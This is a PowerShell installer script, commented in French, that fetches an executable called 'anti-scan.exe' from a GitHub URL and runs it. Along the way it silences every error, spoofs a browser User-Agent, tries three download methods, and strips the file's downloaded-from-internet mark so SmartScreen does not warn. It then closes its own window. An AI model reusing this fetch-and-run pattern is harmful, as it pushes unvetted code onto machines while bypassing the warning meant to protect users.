$ErrorActionPreference = "SilentlyContinue"

$REPO_URL   = "https://raw.githubusercontent.com/AdamZoda/ANTI/main/dist"
$installDir = "$env:LOCALAPPDATA\AntiScan"
$exePath    = "$installDir\anti-scan.exe"

# 1. Arreter proprement tout processus existant
try {
    Get-Process -Name "anti-scan" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
} catch {}
Start-Sleep -Milliseconds 500

# 2. Preparer le repertoire (TOUJOURS creer si absent)
try {
    $null = New-Item -ItemType Directory -Force -Path $installDir
    if (Test-Path $exePath) {
        Remove-Item -Path $exePath -Force -ErrorAction SilentlyContinue
    }
} catch {}

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$downloaded = $false

# 3. Telechargement (Cache Bypass via timestamp)
$cacheBuster = [DateTimeOffset]::Now.ToUnixTimeSeconds()
$downloadUrl = "$REPO_URL/anti-scan.exe?v=$cacheBuster"

try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ANTI-Scanner/3.7"
    $wc.DownloadFile($downloadUrl, $exePath)
    if ((Test-Path $exePath) -and (Get-Item $exePath).Length -gt 1000000) { $downloaded = $true }
} catch {}

if (-not $downloaded) {
    try {
        Invoke-WebRequest -Uri $downloadUrl -OutFile $exePath -UseBasicParsing -ErrorAction Stop
        if ((Test-Path $exePath) -and (Get-Item $exePath).Length -gt 1000000) { $downloaded = $true }
    } catch {}
}

if (-not $downloaded) {
    try {
        Import-Module BitsTransfer -ErrorAction Stop
        Start-BitsTransfer -Source $downloadUrl -Destination $exePath -ErrorAction Stop
        if ((Test-Path $exePath) -and (Get-Item $exePath).Length -gt 1000000) { $downloaded = $true }
    } catch {}
}

if (-not $downloaded) { exit 1 }

# 4. Debloquer le fichier (Zone.Identifier / SmartScreen)
try { Unblock-File -Path $exePath -ErrorAction SilentlyContinue } catch {}

# 5. Lancement de l'EXE dans sa propre fenetre visible
try {
    Start-Process -FilePath $exePath -WindowStyle Normal
} catch {
    try { & "$exePath" } catch {}
}

# 6. Fermer cette fenetre PowerShell
try {
    Stop-Process -Id $PID -Force
} catch {
    exit 0
}
